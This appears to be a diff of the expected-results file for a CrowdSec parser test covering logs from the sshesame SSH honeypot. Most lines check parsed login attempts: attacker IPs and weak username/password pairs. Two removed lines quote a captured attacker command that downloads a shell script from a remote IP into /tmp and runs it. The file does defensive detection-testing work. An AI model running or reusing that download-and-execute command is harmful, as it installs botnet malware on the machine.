+results["s01-parse"]["thespad/sshesame-logs"][59].Evt.Parsed["message"] == "2022/04/16 20:45:50 [64.31.47.254:59024] authentication for user \"admin\" with password \"admin123\" accepted"
+results["s01-parse"]["thespad/sshesame-logs"][59].Evt.Parsed["program"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][59].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][59].Evt.Parsed["sshesame_password"] == "admin123"
+results["s01-parse"]["thespad/sshesame-logs"][59].Evt.Parsed["sshesame_user"] == "admin"
+results["s01-parse"]["thespad/sshesame-logs"][59].Evt.Parsed["timestamp"] == "2022/04/16 20:45:50"
+results["s01-parse"]["thespad/sshesame-logs"][59].Evt.Meta["service"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][59].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][59].Evt.Meta["target_user"] == "admin"
+results["s01-parse"]["thespad/sshesame-logs"][59].Evt.Meta["username"] == "admin"
+results["s01-parse"]["thespad/sshesame-logs"][59].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s01-parse"]["thespad/sshesame-logs"][59].Evt.Meta["datasource_type"] == "file"
+results["s01-parse"]["thespad/sshesame-logs"][59].Evt.Meta["log_type"] == "sshesame_login"
+results["s01-parse"]["thespad/sshesame-logs"][60].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][61].Success == true
+results["s01-parse"]["thespad/sshesame-logs"][61].Evt.Parsed["sshesame_password"] == "admin"
+results["s01-parse"]["thespad/sshesame-logs"][61].Evt.Parsed["sshesame_user"] == "admin"
+results["s01-parse"]["thespad/sshesame-logs"][61].Evt.Parsed["timestamp"] == "2022/04/16 20:45:50"
+results["s01-parse"]["thespad/sshesame-logs"][61].Evt.Parsed["message"] == "2022/04/16 20:45:50 [64.31.47.254:59086] authentication for user \"admin\" with password \"admin\" accepted"
+results["s01-parse"]["thespad/sshesame-logs"][61].Evt.Parsed["program"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][61].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][61].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s01-parse"]["thespad/sshesame-logs"][61].Evt.Meta["datasource_type"] == "file"
+results["s01-parse"]["thespad/sshesame-logs"][61].Evt.Meta["log_type"] == "sshesame_login"
+results["s01-parse"]["thespad/sshesame-logs"][61].Evt.Meta["service"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][61].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][61].Evt.Meta["target_user"] == "admin"
+results["s01-parse"]["thespad/sshesame-logs"][61].Evt.Meta["username"] == "admin"
+results["s01-parse"]["thespad/sshesame-logs"][62].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][63].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][64].Success == true
+results["s01-parse"]["thespad/sshesame-logs"][64].Evt.Parsed["timestamp"] == "2022/04/16 20:45:51"
+results["s01-parse"]["thespad/sshesame-logs"][64].Evt.Parsed["message"] == "2022/04/16 20:45:51 [64.31.47.254:58734] authentication for user \"usuario\" with password \"usuario\" accepted"
+results["s01-parse"]["thespad/sshesame-logs"][64].Evt.Parsed["program"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][64].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][64].Evt.Parsed["sshesame_password"] == "usuario"
+results["s01-parse"]["thespad/sshesame-logs"][64].Evt.Parsed["sshesame_user"] == "usuario"
+results["s01-parse"]["thespad/sshesame-logs"][64].Evt.Meta["datasource_type"] == "file"
+results["s01-parse"]["thespad/sshesame-logs"][64].Evt.Meta["log_type"] == "sshesame_login"
+results["s01-parse"]["thespad/sshesame-logs"][64].Evt.Meta["service"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][64].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][64].Evt.Meta["target_user"] == "usuario"
+results["s01-parse"]["thespad/sshesame-logs"][64].Evt.Meta["username"] == "usuario"
+results["s01-parse"]["thespad/sshesame-logs"][64].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s01-parse"]["thespad/sshesame-logs"][65].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][66].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][67].Success == true
+results["s01-parse"]["thespad/sshesame-logs"][67].Evt.Parsed["program"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][67].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][67].Evt.Parsed["sshesame_password"] == "1"
+results["s01-parse"]["thespad/sshesame-logs"][67].Evt.Parsed["sshesame_user"] == "1"
+results["s01-parse"]["thespad/sshesame-logs"][67].Evt.Parsed["timestamp"] == "2022/04/16 20:45:51"
+results["s01-parse"]["thespad/sshesame-logs"][67].Evt.Parsed["message"] == "2022/04/16 20:45:51 [64.31.47.254:58912] authentication for user \"1\" with password \"1\" accepted"
+results["s01-parse"]["thespad/sshesame-logs"][67].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s01-parse"]["thespad/sshesame-logs"][67].Evt.Meta["datasource_type"] == "file"
+results["s01-parse"]["thespad/sshesame-logs"][67].Evt.Meta["log_type"] == "sshesame_login"
+results["s01-parse"]["thespad/sshesame-logs"][67].Evt.Meta["service"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][67].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][67].Evt.Meta["target_user"] == "1"
+results["s01-parse"]["thespad/sshesame-logs"][67].Evt.Meta["username"] == "1"
+results["s01-parse"]["thespad/sshesame-logs"][68].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][69].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][70].Success == true
+results["s01-parse"]["thespad/sshesame-logs"][70].Evt.Parsed["sshesame_user"] == "root"
+results["s01-parse"]["thespad/sshesame-logs"][70].Evt.Parsed["timestamp"] == "2022/04/16 20:45:52"
+results["s01-parse"]["thespad/sshesame-logs"][70].Evt.Parsed["message"] == "2022/04/16 20:45:52 [64.31.47.254:59100] authentication for user \"root\" with password \"root\" accepted"
+results["s01-parse"]["thespad/sshesame-logs"][70].Evt.Parsed["program"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][70].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][70].Evt.Parsed["sshesame_password"] == "root"
+results["s01-parse"]["thespad/sshesame-logs"][70].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s01-parse"]["thespad/sshesame-logs"][70].Evt.Meta["datasource_type"] == "file"
+results["s01-parse"]["thespad/sshesame-logs"][70].Evt.Meta["log_type"] == "sshesame_login"
+results["s01-parse"]["thespad/sshesame-logs"][70].Evt.Meta["service"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][70].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][70].Evt.Meta["target_user"] == "root"
+results["s01-parse"]["thespad/sshesame-logs"][70].Evt.Meta["username"] == "root"
+results["s01-parse"]["thespad/sshesame-logs"][71].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][72].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][73].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][74].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][75].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][76].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][77].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][78].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][79].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][80].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][81].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][82].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][83].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][84].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][85].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][86].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][87].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][88].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][89].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][90].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][91].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][92].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][93].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][94].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][95].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][96].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][97].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][98].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][99].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][100].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][101].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][102].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][103].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][104].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][105].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][106].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][107].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][108].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][109].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][110].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][111].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][112].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][113].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][114].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][115].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][116].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][117].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][118].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][119].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][120].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][121].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][122].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][123].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][124].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][125].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][126].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][127].Success == true
+results["s01-parse"]["thespad/sshesame-logs"][127].Evt.Parsed["message"] == "2022/04/16 22:00:01 [164.77.39.94:51670] authentication for user \"fangdan\" with password \"fangdan123\" accepted"
+results["s01-parse"]["thespad/sshesame-logs"][127].Evt.Parsed["program"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][127].Evt.Parsed["source_ip"] == "164.77.39.94"
+results["s01-parse"]["thespad/sshesame-logs"][127].Evt.Parsed["sshesame_password"] == "fangdan123"
+results["s01-parse"]["thespad/sshesame-logs"][127].Evt.Parsed["sshesame_user"] == "fangdan"
+results["s01-parse"]["thespad/sshesame-logs"][127].Evt.Parsed["timestamp"] == "2022/04/16 22:00:01"
+results["s01-parse"]["thespad/sshesame-logs"][127].Evt.Meta["service"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][127].Evt.Meta["source_ip"] == "164.77.39.94"
+results["s01-parse"]["thespad/sshesame-logs"][127].Evt.Meta["target_user"] == "fangdan"
+results["s01-parse"]["thespad/sshesame-logs"][127].Evt.Meta["username"] == "fangdan"
+results["s01-parse"]["thespad/sshesame-logs"][127].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s01-parse"]["thespad/sshesame-logs"][127].Evt.Meta["datasource_type"] == "file"
+results["s01-parse"]["thespad/sshesame-logs"][127].Evt.Meta["log_type"] == "sshesame_login"
+results["s01-parse"]["thespad/sshesame-logs"][128].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][129].Success == true
+results["s01-parse"]["thespad/sshesame-logs"][129].Evt.Parsed["message"] == "2022/04/16 22:00:03 [164.77.39.94:51964] authentication for user \"nproc\" with password \"nproc\" accepted"
+results["s01-parse"]["thespad/sshesame-logs"][129].Evt.Parsed["program"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][129].Evt.Parsed["source_ip"] == "164.77.39.94"
+results["s01-parse"]["thespad/sshesame-logs"][129].Evt.Parsed["sshesame_password"] == "nproc"
+results["s01-parse"]["thespad/sshesame-logs"][129].Evt.Parsed["sshesame_user"] == "nproc"
+results["s01-parse"]["thespad/sshesame-logs"][129].Evt.Parsed["timestamp"] == "2022/04/16 22:00:03"
+results["s01-parse"]["thespad/sshesame-logs"][129].Evt.Meta["log_type"] == "sshesame_login"
+results["s01-parse"]["thespad/sshesame-logs"][129].Evt.Meta["service"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][129].Evt.Meta["source_ip"] == "164.77.39.94"
+results["s01-parse"]["thespad/sshesame-logs"][129].Evt.Meta["target_user"] == "nproc"
+results["s01-parse"]["thespad/sshesame-logs"][129].Evt.Meta["username"] == "nproc"
+results["s01-parse"]["thespad/sshesame-logs"][129].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s01-parse"]["thespad/sshesame-logs"][129].Evt.Meta["datasource_type"] == "file"
+results["s01-parse"]["thespad/sshesame-logs"][130].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][131].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][132].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][133].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][134].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][135].Success == false
+len(results["s02-enrich"]["crowdsecurity/dateparse-enrich"]) == 26
 results["s02-enrich"]["crowdsecurity/dateparse-enrich"][0].Success == true
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][0].Evt.Parsed["message"] == "2022/04/16 22:00:01 [164.77.39.94:51670] authentication for user \"fangdan\" with password \"fangdan123\" accepted"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][0].Evt.Parsed["sshesame_user"] == "admin"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][0].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][0].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59114] authentication for user \"admin\" with password \"123\" accepted"
 results["s02-enrich"]["crowdsecurity/dateparse-enrich"][0].Evt.Parsed["program"] == "sshesame"
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][0].Evt.Parsed["source_ip"] == "164.77.39.94"
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][0].Evt.Parsed["sshesame_password"] == "fangdan123"
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][0].Evt.Parsed["sshesame_user"] == "fangdan"
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][0].Evt.Parsed["timestamp"] == "2022/04/16 22:00:01"
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][0].Evt.Meta["timestamp"] == "2022-04-16T22:00:01Z"
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][0].Evt.Meta["username"] == "fangdan"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][0].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][0].Evt.Parsed["sshesame_password"] == "123"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][0].Evt.Meta["timestamp"] == "2022-04-16T20:45:49Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][0].Evt.Meta["username"] == "admin"
 results["s02-enrich"]["crowdsecurity/dateparse-enrich"][0].Evt.Meta["datasource_path"] == "sshesame.log"
 results["s02-enrich"]["crowdsecurity/dateparse-enrich"][0].Evt.Meta["datasource_type"] == "file"
 results["s02-enrich"]["crowdsecurity/dateparse-enrich"][0].Evt.Meta["log_type"] == "sshesame_login"
 results["s02-enrich"]["crowdsecurity/dateparse-enrich"][0].Evt.Meta["service"] == "sshesame"
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][0].Evt.Meta["source_ip"] == "164.77.39.94"
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][0].Evt.Meta["target_user"] == "fangdan"
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][0].Evt.Enriched["MarshaledTime"] == "2022-04-16T22:00:01Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][0].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][0].Evt.Meta["target_user"] == "admin"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][0].Evt.Enriched["MarshaledTime"] == "2022-04-16T20:45:49Z"
 results["s02-enrich"]["crowdsecurity/dateparse-enrich"][1].Success == true
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][1].Evt.Parsed["message"] == "2022/04/16 22:00:03 [164.77.39.94:51964] authentication for user \"nproc\" with password \"nproc\" accepted"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][1].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58960] authentication for user \"2\" with password \"2\" accepted"
 results["s02-enrich"]["crowdsecurity/dateparse-enrich"][1].Evt.Parsed["program"] == "sshesame"
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][1].Evt.Parsed["source_ip"] == "164.77.39.94"
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][1].Evt.Parsed["sshesame_password"] == "nproc"
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][1].Evt.Parsed["sshesame_user"] == "nproc"
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][1].Evt.Parsed["timestamp"] == "2022/04/16 22:00:03"
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][1].Evt.Meta["datasource_path"] == "sshesame.log"
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][1].Evt.Meta["datasource_type"] == "file"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][1].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][1].Evt.Parsed["sshesame_password"] == "2"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][1].Evt.Parsed["sshesame_user"] == "2"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][1].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
 results["s02-enrich"]["crowdsecurity/dateparse-enrich"][1].Evt.Meta["log_type"] == "sshesame_login"
 results["s02-enrich"]["crowdsecurity/dateparse-enrich"][1].Evt.Meta["service"] == "sshesame"
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][1].Evt.Meta["source_ip"] == "164.77.39.94"
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][1].Evt.Meta["target_user"] == "nproc"
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][1].Evt.Meta["timestamp"] == "2022-04-16T22:00:03Z"
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][1].Evt.Meta["username"] == "nproc"
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][1].Evt.Enriched["MarshaledTime"] == "2022-04-16T22:00:03Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][1].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][1].Evt.Meta["target_user"] == "2"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][1].Evt.Meta["timestamp"] == "2022-04-16T20:45:49Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][1].Evt.Meta["username"] == "2"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][1].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][1].Evt.Meta["datasource_type"] == "file"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][1].Evt.Enriched["MarshaledTime"] == "2022-04-16T20:45:49Z"
 results["s02-enrich"]["crowdsecurity/dateparse-enrich"][2].Success == true
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][2].Evt.Parsed["sshesame_password"] == "admin1234"
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][2].Evt.Parsed["sshesame_user"] == "admin"
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][2].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][2].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59078] authentication for user \"admin\" with password \"admin1234\" accepted"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][2].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58710] authentication for user \"admin\" with password \"1234\" accepted"
 results["s02-enrich"]["crowdsecurity/dateparse-enrich"][2].Evt.Parsed["program"] == "sshesame"
 results["s02-enrich"]["crowdsecurity/dateparse-enrich"][2].Evt.Parsed["source_ip"] == "64.31.47.254"
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][2].Evt.Meta["datasource_type"] == "file"
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][2].Evt.Meta["log_type"] == "sshesame_login"
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][2].Evt.Meta["service"] == "sshesame"
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][2].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][2].Evt.Parsed["sshesame_password"] == "1234"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][2].Evt.Parsed["sshesame_user"] == "admin"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][2].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
 results["s02-enrich"]["crowdsecurity/dateparse-enrich"][2].Evt.Meta["target_user"] == "admin"
 results["s02-enrich"]["crowdsecurity/dateparse-enrich"][2].Evt.Meta["timestamp"] == "2022-04-16T20:45:49Z"
 results["s02-enrich"]["crowdsecurity/dateparse-enrich"][2].Evt.Meta["username"] == "admin"
 results["s02-enrich"]["crowdsecurity/dateparse-enrich"][2].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][2].Evt.Meta["datasource_type"] == "file"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][2].Evt.Meta["log_type"] == "sshesame_login"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][2].Evt.Meta["service"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][2].Evt.Meta["source_ip"] == "64.31.47.254"
 results["s02-enrich"]["crowdsecurity/dateparse-enrich"][2].Evt.Enriched["MarshaledTime"] == "2022-04-16T20:45:49Z"
 results["s02-enrich"]["crowdsecurity/dateparse-enrich"][3].Success == true
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][3].Evt.Parsed["source_ip"] == "64.31.47.254"
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][3].Evt.Parsed["sshesame_cmd"] == "cd /tmp; rm -rf wget*; curl -O http://45.95.55.24/wget.sh; wget http://45.95.55.24/wget.sh; chmod 777 wget.sh; ./wget.sh"
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][3].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][3].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59114] [channel 0] command \"cd /tmp; rm -rf wget*; curl -O http://45.95.55.24/wget.sh; wget http://45.95.55.24/wget.sh; chmod 777 wget.sh; ./wget.sh\" requested"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][3].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58714] authentication for user \"1234\" with password \"1234\" accepted"
 results["s02-enrich"]["crowdsecurity/dateparse-enrich"][3].Evt.Parsed["program"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][3].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][3].Evt.Parsed["sshesame_password"] == "1234"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][3].Evt.Parsed["sshesame_user"] == "1234"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][3].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
 results["s02-enrich"]["crowdsecurity/dateparse-enrich"][3].Evt.Meta["datasource_type"] == "file"
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][3].Evt.Meta["log_type"] == "sshesame_cmd"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][3].Evt.Meta["log_type"] == "sshesame_login"
 results["s02-enrich"]["crowdsecurity/dateparse-enrich"][3].Evt.Meta["service"] == "sshesame"
 results["s02-enrich"]["crowdsecurity/dateparse-enrich"][3].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][3].Evt.Meta["target_user"] == "1234"
 results["s02-enrich"]["crowdsecurity/dateparse-enrich"][3].Evt.Meta["timestamp"] == "2022-04-16T20:45:49Z"
-results["s02-enrich"]["crowdsecurity/dateparse-enrich"][3].Evt.Meta["command"] == "cd /tmp; rm -rf wget*; curl -O http://45.95.55.24/wget.sh; wget http://45.95.55.24/wget.sh; chmod 777 wget.sh; ./wget.sh"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][3].Evt.Meta["username"] == "1234"
 results["s02-enrich"]["crowdsecurity/dateparse-enrich"][3].Evt.Meta["datasource_path"] == "sshesame.log"
 results["s02-enrich"]["crowdsecurity/dateparse-enrich"][3].Evt.Enriched["MarshaledTime"] == "2022-04-16T20:45:49Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][4].Success == true
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][4].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59062] authentication for user \"cisco\" with password \"cisco\" accepted"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][4].Evt.Parsed["program"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][4].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][4].Evt.Parsed["sshesame_password"] == "cisco"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][4].Evt.Parsed["sshesame_user"] == "cisco"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][4].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][4].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][4].Evt.Meta["target_user"] == "cisco"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][4].Evt.Meta["timestamp"] == "2022-04-16T20:45:49Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][4].Evt.Meta["username"] == "cisco"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][4].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][4].Evt.Meta["datasource_type"] == "file"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][4].Evt.Meta["log_type"] == "sshesame_login"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][4].Evt.Meta["service"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][4].Evt.Enriched["MarshaledTime"] == "2022-04-16T20:45:49Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][5].Success == true
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][5].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58862] authentication for user \"admin\" with password \"password\" accepted"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][5].Evt.Parsed["program"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][5].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][5].Evt.Parsed["sshesame_password"] == "password"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][5].Evt.Parsed["sshesame_user"] == "admin"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][5].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][5].Evt.Meta["timestamp"] == "2022-04-16T20:45:49Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][5].Evt.Meta["username"] == "admin"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][5].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][5].Evt.Meta["datasource_type"] == "file"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][5].Evt.Meta["log_type"] == "sshesame_login"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][5].Evt.Meta["service"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][5].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][5].Evt.Meta["target_user"] == "admin"
